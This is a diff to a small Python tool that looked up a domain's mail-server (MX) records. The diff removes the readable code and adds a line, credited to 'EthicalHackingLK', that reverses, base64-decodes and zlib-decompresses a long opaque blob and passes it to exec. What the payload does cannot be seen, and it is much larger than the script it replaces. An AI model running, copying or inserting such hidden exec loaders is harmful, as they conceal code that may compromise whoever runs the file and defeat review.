@@ -1,30 +1,5 @@
-import dns.resolver
-import os
+# obfuscation by EthicalHackingLK
+                    
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
 
-tex = """
-╭━╮╭━╮   ╭╮╭━━━╮ ╭╮    ╭━━━╮     ╭╮
-┃┃╰╯┃┃   ┃┃┃╭━╮┃ ┃┃    ┃╭━━╯     ┃┃
-┃╭╮╭╮┣━━┳┫┃┃┃ ┃┣━╯┣┳╮╭╮┃╰━━┳┳━╮╭━╯┣━━┳━╮
-┃┃┃┃┃┃╭╮┣┫┃┃╰━╯┃╭╮┣┫╰╯┃┃╭━━╋┫╭╮┫╭╮┃┃━┫╭╯
-┃┃┃┃┃┃╭╮┃┃╰┫╭━╮┃╰╯┃┃┃┃┃┃┃  ┃┃┃┃┃╰╯┃┃━┫┃
-╰╯╰╯╰┻╯╰┻┻━┻╯ ╰┻━━┻┻┻┻╯╰╯  ╰┻╯╰┻━━┻━━┻╯ \n\n"""
-
-
-os.system('cls' if os.name == 'nt' else 'clear')
-print(tex)
-domain = input("Input Domain (Ex => example.com)  =  ")
-os.system('cls' if os.name == 'nt' else 'clear')
-answers = dns.resolver.resolve(domain, 'MX')
-
-
-
-for rdata in answers:
-    data=open("data.txt",'a')
-    data.write(str(rdata.exchange))
-    data.write('\n\n')
-    print("Mail Server = ",rdata.exchange,'\n')
-    data.close()
-
-p=os.getcwd()
-print("Youer Data Saved In {p}\data.txt \n")
     
